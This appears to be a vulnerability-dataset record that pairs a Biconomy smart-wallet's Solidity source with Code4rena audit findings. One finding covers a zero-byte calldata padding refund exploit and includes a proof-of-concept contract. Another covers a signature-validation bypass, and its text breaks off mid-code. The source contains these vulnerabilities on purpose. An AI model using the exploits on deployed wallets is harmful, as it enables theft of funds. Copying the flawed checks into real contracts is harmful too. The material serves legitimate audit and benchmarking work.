baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"\n    // );\n    bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;\n\n    // Owner storage\n    address public owner;\n\n    // uint96 private _nonce; //changed to 2D nonce below\n    // @notice there is no _nonce \n    mapping(uint256 => uint256) public nonces;\n\n    // AA storage\n    // review\n    IEntryPoint private _entryPoint;\n\n    \n    // Events\n    // EOA + Version tracking\n    event ImplementationUpdated(address _scw, string version, address newImplementation);\n    event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n    event EOAChanged(address indexed _scw, address indexed _oldEOA, address indexed _newEOA);\n    event WalletHandlePayment(bytes32 txHash, uint256 payment);\n    // nice to have\n    // event SmartAccountInitialized(IEntryPoint indexed entryPoint, address indexed owner);\n\n    // modifiers\n    // onlyOwner\n    /**\n     * @notice Throws if the sender is not an the owner.\n     */\n    modifier onlyOwner {\n        require(msg.sender == owner, \"Smart Account:: Sender is not authorized\");\n        _;\n    }\n\n    // onlyOwner OR self\n    modifier mixedAuth {\n        require(msg.sender == owner || msg.sender == address(this),\"Only owner or self\");\n        _;\n   }\n\n   // only from EntryPoint\n   modifier onlyEntryPoint {\n        require(msg.sender == address(entryPoint()), \"wallet: not from EntryPoint\");\n        _; \n   }\n\n   function nonce() public view virtual override returns (uint256) {\n        return nonces[0];\n    }\n\n    function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n        return nonces[_batchId];\n    }\n\n    function entryPoint() public view virtual override returns (IEntryPoint) {\n        return _entryPoint;\n    }\n\n    // @notice authorized modifier (onlySelf) is already inherited\n\n    // Setters\n\n    function setOwner(address _newOwner) external mixedAuth {\n        require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n        address oldOwner = owner;\n        owner = _newOwner;\n        emit EOAChanged(address(this), oldOwner, _newOwner);\n    }\n\n    /**\n     * @notice Updates the implementation of the base wallet\n     * @param _implementation New wallet implementation\n     */\n    function updateImplementation(address _implementation) external mixedAuth {\n        require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\");\n        _setImplementation(_implementation);\n        // EOA + Version tracking\n        emit ImplementationUpdated(address(this), VERSION, _implementation);\n    }\n\n    function updateEntryPoint(address _newEntryPoint) external mixedAuth {\n        require(_newEntryPoint != address(0), \"Smart Account:: new entry point address cannot be zero\");\n        emit EntryPointChanged(address(_entryPoint), _newEntryPoint);\n        _entryPoint = IEntryPoint(payable(_newEntryPoint));\n    }\n\n    // Getters\n\n    function domainSeparator() public view returns (bytes32) {\n        return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n    }\n\n    /// @dev Returns the chain id used by this contract.\n    function getChainId() public view returns (uint256) {\n        uint256 id;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            id := chainid()\n        }\n        return id;\n    }\n\n    //@review getNonce specific to EntryPoint requirements\n    /**\n     * @dev returns a value from the nonces 2d mapping\n     * @param batchId : the key of the user's batch being queried\n     * @return nonce : the number of transaction made within said batch\n     */\n    function getNonce(uint256 batchId)\n    public view\n    returns (uint256) {\n        return nonces[batchId];\n    }\n\n\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer { \n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n\n    /**\n     * @dev Returns the largest of two numbers.\n     */\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a >= b ? a : b;\n    }\n\n    // Gnosis style transaction with optional repay in native tokens OR ERC20 \n    /// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.\n    /// Note: The fees are always transferred, even if the user transaction fails.\n    /// @param _tx Wallet transaction \n    /// @param batchId batchId key for 2D nonces\n    /// @param refundInfo Required information for gas refunds\n    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) public payable virtual override returns (bool success) {\n        // initial gas = 21k + non_zero_bytes * 16 + zero_bytes * 4\n        //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n        uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n        //console.log(\"init %s\", 21000 + msg.data.length * 8);\n        bytes32 txHash;\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            bytes memory txHashData =\n                encodeTransactionData(\n                    // Transaction info\n                    _tx,\n                    // Payment info\n                    refundInfo,\n                    // Signature info\n                    nonces[batchId]\n                );\n            // Increase nonce and execute transaction.\n            // Default space aka batchId is 0\n            nonces[batchId]++;\n            txHash = keccak256(txHashData);\n            checkSignatures(txHash, txHashData, signatures);\n        }\n\n\n        // We require some gas to emit the events (at least 2500) after the execution and some to perform code until the execution (500)\n        // We also include the 1/64 in the check that is not send along with a call to counteract potential shortings because of EIP-150\n        require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n        // Use scope here to limit variable lifetime and prevent `stack too deep` errors\n        {\n            // If the gasPrice is 0 we assume that nearly all available gas can be used (it is always more than targetTxGas)\n            // We only substract 2500 (compared to the 3000 before) to ensure that the amount passed is still higher than targetTxGas\n            success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() - 2500) : _tx.targetTxGas);\n            // If no targetTxGas and no gasPrice was set (e.g. both are 0), then the internal tx is required to be successful\n            // This makes it possible to use `estimateGas` without issues, as it searches for the minimum gas where the tx doesn't revert\n            require(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;\n            if (refundInfo.gasPrice > 0) {\n                //console.log(\"sent %s\", startGas - gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n            // extraGas = extraGas - gasleft();\n            //console.log(\"extra gas %s \", extraGas);\n        }\n    }\n\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n\n    function handlePaymentRevert(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) external returns (uint256 payment) {\n        uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hpr %s\", requiredGas);\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /**\n     * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n     * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory data,\n        bytes memory signatures\n    ) public view virtual {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i = 0;\n        address _signer;\n        (v, r, s) = signatureSplit(signatures, i);\n        //review\n        if(v == 0) {\n            // If v is 0 then it is a contract signature\n            // When handling contract signatures the address of the contract is encoded into r\n            _signer = address(uint160(uint256(r)));\n\n            // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes\n                // This check is not completely accurate, since it is possible that more signatures than the threshold are send.\n                // Here we only check that the pointer is not pointing inside the part that is being processed\n                require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n\n                // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\n                require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n\n                // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n                uint256 contractSignatureLen;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    contractSignatureLen := mload(add(add(signatures, s), 0x20))\n                }\n                require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n\n                // Check signature\n                bytes memory contractSignature;\n                // solhint-disable-next-line no-inline-assembly\n                assembly {\n                    // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s\n                    contractSignature := add(add(signatures, s), 0x20)\n                }\n                require(ISignatureValidator(_signer).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, \"BSA024\");\n        }\n        else if(v > 30) {\n            // If v > 30 then default va (27,28) has been adjusted for eth_sign flow\n            // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover\n            _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        } else {\n            _signer = ecrecover(dataHash, v, r, s);\n            require(_signer == owner, \"INVALID_SIGNATURE\");\n        }\n    }\n\n    /// @dev Allows to estimate a transaction.\n    ///      This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data.\n    ///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`\n    /// @param to Destination address of Safe transaction.\n    /// @param value Ether value of transaction.\n    /// @param data Data payload of transaction.\n    /// @param operation Operation type of transaction.\n    /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs).\n    function requiredTxGas(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation\n    ) external returns (uint256) {\n        uint256 startGas = gasleft();\n        // We don't provide an error message here, as we use it to return the estimate\n        require(execute(to, value, data, operation, gasleft()));\n        uint256 requiredGas = startGas - gasleft();\n        // Convert response to string and return via error message\n        revert(string(abi.encodePacked(requiredGas)));\n    }\n\n    /// @dev Returns hash to be signed by owner.\n    /// @param to Destination address.\n    /// @param value Ether value.\n    /// @param data Data payload.\n    /// @param operation Operation type.\n    /// @param targetTxGas Fas that should be used for the safe transaction.\n    /// @param baseGas Gas costs for data used to trigger the safe transaction.\n    /// @param gasPrice Maximum gas price that should be used for this transaction.\n    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.\n    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash.\n    function getTransactionHash(\n        address to,\n        uint256 value,\n        bytes calldata data,\n        Enum.Operation operation,\n        uint256 targetTxGas,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver,\n        uint256 _nonce\n    ) public view returns (bytes32) {\n        Transaction memory _tx = Transaction({\n            to: to,\n            value: value,\n            data: data,\n            operation: operation,\n            targetTxGas: targetTxGas\n        });\n        FeeRefund memory refundInfo = FeeRefund({\n            baseGas: baseGas,\n            gasPrice: gasPrice,\n            tokenGasPriceFactor: tokenGasPriceFactor,\n            gasToken: gasToken,\n            refundReceiver: refundReceiver\n        });\n        return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\n    }\n\n    /// @dev Returns the bytes that are hashed to be signed by owner.\n    /// @param _tx Wallet transaction \n    /// @param refundInfo Required information for gas refunds\n    /// @param _nonce Transaction nonce.\n    /// @return Transaction hash bytes.\n    function encodeTransactionData(\n        Transaction memory _tx,\n        FeeRefund memory refundInfo,\n        uint256 _nonce\n    ) public view returns (bytes memory) {\n        bytes32 safeTxHash =\n            keccak256(\n                abi.encode(\n                    ACCOUNT_TX_TYPEHASH,\n                    _tx.to,\n                    _tx.value,\n                    keccak256(_tx.data),\n                    _tx.operation,\n                    _tx.targetTxGas,\n                    refundInfo.baseGas,\n                    refundInfo.gasPrice,\n                    refundInfo.gasToken,\n                    refundInfo.refundReceiver,\n                    _nonce\n                )\n            );\n        return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash);\n    }\n\n    // Extra Utils \n    function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n        require(dest != address(0), \"this action will burn your funds\");\n        (bool success,) = dest.call{value:amount}(\"\");\n        require(success,\"transfer failed\");\n    }\n\n    function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n        IERC20 tokenContract = IERC20(token);\n        SafeERC20.safeTransfer(tokenContract, dest, amount);\n    }\n\n    function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        _call(dest, value, func);\n    }\n\n    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n        _requireFromEntryPointOrOwner();\n        require(dest.length == func.length, \"wrong array lengths\");\n        for (uint i = 0; i < dest.length;) {\n            _call(dest[i], 0, func[i]);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    // AA implementation\n    function _call(address target, uint256 value, bytes memory data) internal {\n        (bool success, bytes memory result) = target.call{value : value}(data);\n        if (!success) {\n            assembly {\n                revert(add(result, 32), mload(result))\n            }\n        }\n    }\n    \n    //called by entryPoint, only after validateUserOp succeeded.\n    //@review\n    //Method is updated to instruct delegate call and emit regular events\n    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n        success = execute(dest, value, func, operation, gasLimit);\n        require(success, \"Userop Failed\");\n    }\n\n    function _requireFromEntryPointOrOwner() internal view {\n        require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");\n    }\n\n    /// implement template method of BaseAccount\n    // @notice Nonce space is locked to 0 for AA transactions\n    // userOp could have batchId as well\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {\n        require(nonces[0]++ == userOp.nonce, \"account: invalid nonce\");\n    }\n\n    /// implement template method of BaseAccount\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address)\n    internal override virtual returns (uint256 deadline) {\n        bytes32 hash = userOpHash.toEthSignedMessageHash();\n        //ignore signature mismatch of from==ZERO_ADDRESS (for eth_callUserOp validation purposes)\n        // solhint-disable-next-line avoid-tx-origin\n        require(owner == hash.recover(userOp.signature) || tx.origin == address(0), \"account: wrong signature\");\n        return 0;\n    }\n\n    /**\n     * check current account deposit in the entryPoint\n     */\n    function getDeposit() public view returns (uint256) {\n        return entryPoint().balanceOf(address(this));\n    }\n\n    /**\n     * deposit more funds for this account in the entryPoint\n     */\n    function addDeposit() public payable {\n\n        (bool req,) = address(entryPoint()).call{value : msg.value}(\"\");\n        require(req);\n    }\n\n    /**\n     * withdraw value from the account's deposit\n     * @param withdrawAddress target to send to\n     * @param amount to withdraw\n     */\n    function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n        entryPoint().withdrawTo(withdrawAddress, amount);\n    }\n\n    /**\n     * @notice Query if a contract implements an interface\n     * @param interfaceId The interface identifier, as specified in ERC165\n     * @return `true` if the contract implements `_interfaceID`\n    */\n    function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId; // 0x01ffc9a7\n    }\n\n    // solhint-disable-next-line no-empty-blocks\n    receive() external payable {}\n}\n\n// SPDX-License-Identifier: GPL-3.0\npragma solidity 0.8.12;\n\n/* solhint-disable avoid-low-level-calls */\n/* solhint-disable no-inline-assembly */\n/* solhint-disable reason-string */\n\nimport \"@account-abstraction/contracts/interfaces/IAccount.sol\";\nimport \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\nimport \"./common/Enum.sol\";\n\nstruct Transaction {\n        address to;\n        uint256 value;\n        bytes data;\n        Enum.Operation operation;\n        uint256 targetTxGas;\n    }\n\nstruct FeeRefund {\n        uint256 baseGas;\n        uint256 gasPrice; //gasPrice or tokenGasPrice\n        uint256 tokenGasPriceFactor;\n        address gasToken;\n        address payable refundReceiver;\n    }\n\n/**\n * Basic account implementation.\n * this contract provides the basic logic for implementing the IAccount interface  - validateUserOp\n * specific account implementation should inherit it and provide the account-specific logic\n */\nabstract contract BaseSmartAccount is IAccount {\n    using UserOperationLib for UserOperation;\n\n\n    /**\n     * return the account nonce.\n     * subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)\n     */\n    function nonce() public view virtual returns (uint256);\n\n     /**\n     * return the account nonce.\n     * subclass should return a nonce value that is used both by _validateAndUpdateNonce, and by the external provider (to read the current nonce)\n     */\n    function nonce(uint256 _batchId) public view virtual returns (uint256);\n\n    /**\n     * return the entryPoint used by this account.\n     * subclass should return the current entryPoint used by this account.\n     */\n    function entryPoint() public view virtual returns (IEntryPoint);\n\n    /**\n     * Validate user's signature and nonce.\n     * subclass doesn't need to override this method. Instead, it should override the specific internal validation methods.\n     */\n    // review virtual \n    function validateUserOp(UserOperation calldata userOp, bytes32 userOpHash, address aggregator, uint256 missingAccountFunds)\n    external override virtual returns (uint256 deadline) {\n        _requireFromEntryPoint();\n        deadline = _validateSignature(userOp, userOpHash, aggregator);\n        if (userOp.initCode.length == 0) {\n            _validateAndUpdateNonce(userOp);\n        }\n        _payPrefund(missingAccountFunds);\n    }\n\n    /**\n     * ensure the request comes from the known entrypoint.\n     */\n    function _requireFromEntryPoint() internal virtual view {\n        require(msg.sender == address(entryPoint()), \"account: not from EntryPoint\");\n    }\n\n    /**\n     * validate the signature is valid for this message.\n     * @param userOp validate the userOp.signature field\n     * @param userOpHash convenient field: the hash of the request, to check the signature against\n     *          (also hashes the entrypoint and chain-id)\n     * @param aggregator the current aggregator. can be ignored by accounts that don't use aggregators\n     * @return deadline the last block timestamp this operation is valid, or zero if it is valid indefinitely.\n     *      Note that the validation code cannot use block.timestamp (or block.number) directly.\n     */\n    // Review if we need to make view function\n    function _validateSignature(UserOperation calldata userOp, bytes32 userOpHash, address aggregator)\n    internal virtual returns (uint256 deadline);\n\n    /**\n     * validate the current nonce matches the UserOperation nonce.\n     * then it should update the account's state to prevent replay of this UserOperation.\n     * called only if initCode is empty (since \"nonce\" field is used as \"salt\" on account creation)\n     * @param userOp the op to validate.\n     */\n    function _validateAndUpdateNonce(UserOperation calldata userOp) internal virtual;\n\n    /**\n     * sends to the entrypoint (msg.sender) the missing funds for this transaction.\n     * subclass MAY override this method for better funds management\n     * (e.g. send to the entryPoint more than the minimum required, so that in future transactions\n     * it will not be required to send again)\n     * @param missingAccountFunds the minimum value this method should send the entrypoint.\n     *  this value MAY be zero, in case there is enough deposit, or the userOp has a paymaster.\n     */\n    function _payPrefund(uint256 missingAccountFunds) internal virtual {\n        if (missingAccountFunds != 0) {\n            (bool success,) = payable(msg.sender).call{value : missingAccountFunds, gas : type(uint256).max}(\"\");\n            (success);\n            //ignore failure (its EntryPoint's job to verify, not account.)\n        }\n    }\n    \n    function init(address _owner, address _entryPointAddress, address _handler) external virtual;\n\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures) public payable virtual returns (bool success);\n}\n\n",
        "CodeNames": [
            "SmartAccount.sol",
            "BaseSmartAccount.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-02",
                "Location": [
                    "\nabi.encodeWithSignature(RelayerManager.execute.selector, (...))\n",
                    "\n// Basically, just add zero bytes at the end\nabi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[]\n",
                    "//solidity\npragma //solidity ^0.8.12;\n\ncontract DummySmartWallet {\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) external {\n        // Do nothing, just test that data with appended zero bytes are accepted by Solidity\n    }\n}\n\ncontract PoC {\n    address immutable smartWallet;\n\n    constructor() {\n        smartWallet = address(new DummySmartWallet());\n    }\n\n    // Successfully call with original data\n    function testWithOriginalData() external {\n        bytes memory txCalldata = _getOriginalTxCalldata();\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    // Successfully call with original data + padded zero bytes\n    function testWithModifiedData() external {\n        bytes memory originalTxCalldata = _getOriginalTxCalldata();\n        bytes memory zeroBytes = new bytes(100000);\n\n        bytes memory txCalldata = abi.encodePacked(originalTxCalldata, zeroBytes);\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    function _getOriginalTxCalldata() internal pure returns(bytes memory) {\n        Transaction memory transaction;\n        FeeRefund memory refundInfo;\n        bytes memory signatures;\n        return abi.encodeWithSelector(DummySmartWallet.execTransaction.selector, transaction, uint256(0), refundInfo, signatures);\n    }\n}\n"
                ],
                "Type": " Theft of funds under relaying the transaction",
                "Description": "*Submitted by V_B(https://github.com/code-423n4/2023-01-biconomy-findings/issues/489), also found by DevTimSch(https://github.com/code-423n4/2023-01-biconomy-findings/issues/535)*\n\ncontracts/smart-contract-wallet/SmartAccount.sol#L200(https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200)<br\ncontracts/smart-contract-wallet/SmartAccount.sol#L239(https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239)<br\ncontracts/smart-contract-wallet/SmartAccount.sol#L248(https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L248)\n\nThe execTransaction function is designed to accept a relayed transaction with a transaction cost refund. At the beginning of the function, the startGas value is calculated as the amount of gas that the relayer will approximately spend on the transaction initialization, including the base cost of 21000 gas and the cost per calldata byte of msg.data.length * 8 gas. At the end of the function, the total consumed gas is calculated as gasleft() startGas and the appropriate refund is sent to the relayer.\n\nAn attacker could manipulate the calldata to increase the refund amount while spending less gas than what is calculated by the contract. To do this, the attacker could provide calldata with zero padded bytes of arbitrary length. This would only cost 4 gas per zero byte, but the refund would be calculated as 8 gas per calldata byte. As a result, the refund amount would be higher than the gas amount spent by the relayer.\n\n\nLet\u2019s a smart wallet user signs a transaction. Some of the relayers trying to execute this transaction and send a transaction to the SmartAccount contract. Then, an attacker can frontrun the transaction, changing the transaction calldata by adding the zeroes bytes at the end.\n\nSo, the original transaction has such calldata:\n\n\nabi.encodeWithSignature(RelayerManager.execute.selector, (...))\n\n\nThe modified (frontrun) transaction calldata:\n\n\n// Basically, just add zero bytes at the end\nabi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[]\n\n\n\nThe PoC shows that the function may accept the data with redundant zeroes at the end. At the code above, an attacker send a 100_000 meaningless zeroes bytes, that gives a 100_000 * 4 = 400_000 additional gas refund. Technically, it is possible to pass even more zero bytes.\n\nsolidity\npragma solidity ^0.8.12;\n\ncontract DummySmartWallet {\n    function execTransaction(\n        Transaction memory _tx,\n        uint256 batchId,\n        FeeRefund memory refundInfo,\n        bytes memory signatures\n    ) external {\n        // Do nothing, just test that data with appended zero bytes are accepted by Solidity\n    }\n}\n\ncontract PoC {\n    address immutable smartWallet;\n\n    constructor() {\n        smartWallet = address(new DummySmartWallet());\n    }\n\n    // Successfully call with original data\n    function testWithOriginalData() external {\n        bytes memory txCalldata = _getOriginalTxCalldata();\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    // Successfully call with original data + padded zero bytes\n    function testWithModifiedData() external {\n        bytes memory originalTxCalldata = _getOriginalTxCalldata();\n        bytes memory zeroBytes = new bytes(100000);\n\n        bytes memory txCalldata = abi.encodePacked(originalTxCalldata, zeroBytes);\n\n        (bool success, ) = smartWallet.call(txCalldata);\n        require(success);\n    }\n\n    function _getOriginalTxCalldata() internal pure returns(bytes memory) {\n        Transaction memory transaction;\n        FeeRefund memory refundInfo;\n        bytes memory signatures;\n        return abi.encodeWithSelector(DummySmartWallet.execTransaction.selector, transaction, uint256(0), refundInfo, signatures);\n    }\n}\n\n\n\nAn attacker to manipulate the gas refund amount to be higher than the gas amount spent, potentially leading to arbitrary big ether loses by a smart wallet.\n\n",
                "Repair": "\nYou can calculate the number of bytes used by the relayer as a sum per input parameter. Then an attacker won't have the advantage of providing non-standard ABI encoding for the PoC calldata.\n\n    // Sum the length of each  bynamic and static length parameters.\n    uint256 expectedNumberOfBytes = _tx.data.length + signatures.length + 12 * 32;\n    uint256 dataLen = Math.min(msg.data.length, expectedNumberOfBytes);\n\nPlease note, the length of the signature must also be bounded to eliminate the possibility to put meaningless zeroes there.\n\nlivingrockrises (Biconomy) confirmed(https://github.com/code-423n4/2023-01-biconomy-findings/issues/489#issuecomment-1403151073)\n\n\n\n*\n\n\n"
            },
            {
                "Name": "H-04",
                "Location": [
                    "execTransaction",
                    "isValidSignature",
                    "updateImplementation",
                    "EIP",
                    "address(this)",
                    "_signer",
                    "checkSignature",
                    "checkSignatures"
                ],
                "Type": " Arbitrary transactions possible due to insufficient signature validation",
                "Description": "*Submitted by 0xdeadbeef0x(https://github.com/code-423n4/2023-01-biconomy-findings/issues/175), also found by V_B(https://github.com/code-423n4/2023-01-biconomy-findings/issues/486), gogo(https://github.com/code-423n4/2023-01-biconomy-findings/issues/477), gogo(https://github.com/code-423n4/2023-01-biconomy-findings/issues/476), Fon(https://github.com/code-423n4/2023-01-biconomy-findings/issues/470), adriro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/449), Tricko(https://github.com/code-423n4/2023-01-biconomy-findings/issues/433), immeas(https://github.com/code-423n4/2023-01-biconomy-findings/issues/382), Haipls(https://github.com/code-423n4/2023-01-biconomy-findings/issues/367), ayeslick(https://github.com/code-423n4/2023-01-biconomy-findings/issues/358), wait(https://github.com/code-423n4/2023-01-biconomy-findings/issues/347), Lirios(https://github.com/code-423n4/2023-01-biconomy-findings/issues/334), Koolex(https://github.com/code-423n4/2023-01-biconomy-findings/issues/322), Atarpara(https://github.com/code-423n4/2023-01-biconomy-findings/issues/286), bin2chen(https://github.com/code-423n4/2023-01-biconomy-findings/issues/282), hihen(https://github.com/code-423n4/2023-01-biconomy-findings/issues/271), ast3ros(https://github.com/code-423n4/2023-01-biconomy-findings/issues/267), wallstreetvilkas(https://github.com/code-423n4/2023-01-biconomy-findings/issues/256), romand(https://github.com/code-423n4/2023-01-biconomy-findings/issues/163), ladboy233(https://github.com/code-423n4/2023-01-biconomy-findings/issues/114), ro(https://github.com/code-423n4/2023-01-biconomy-findings/issues/108), BClabs(https://github.com/code-423n4/2023-01-biconomy-findings/issues/87), StErMi(https://github.com/code-423n4/2023-01-biconomy-findings/issues/85), static(https://github.com/code-423n4/2023-01-biconomy-findings/issues/62), Manboy(https://github.com/code-423n4/2023-01-biconomy-findings/issues/50), csanuragjain(https://github.com/code-423n4/2023-01-biconomy-findings/issues/34), and kankodu(https://github.com/code-423n4/2023-01-biconomy-findings/issues/15)*\n\nA hacker can create arbitrary transaction through the smart wallet by evading signature validation.\n\nMajor impacts:\n\n1.  Steal all funds from the smart wallet and destroy the proxy\n2.  Lock the wallet from EOAs by updating the implementation contract\n    1.  New implementation can transfer all funds or hold some kind of ransom\n    2.  New implementation can take time to unstake funds from protocols\n\n\nThe protocol supports contract signed transactions (eip-1271). The support is implemented in the checkSignature call when providing a transaction:<br\ncontracts/smart-contract-wallet/SmartAccount.sol#L218(https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L218)<br\ncontracts/smart-contract-wallet/SmartAccount.sol#L342(https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342)\n\n\n    function execTransaction(\n            Transaction memory _tx,\n            uint256 batchId,\n            FeeRefund memory refundInfo,\n            bytes memory signatures\n        ) public payable virtual override returns (bool success) {\n    ---------\n                checkSignatures(txHash, txHashData, signatures);\n            }\n    ---------\n                success = execute(_tx.to, _tx.value, _tx.data, _tx.operation, refundInfo.gasPrice == 0 ? (gasleft() 2500) : _tx.targetTxGas);\n    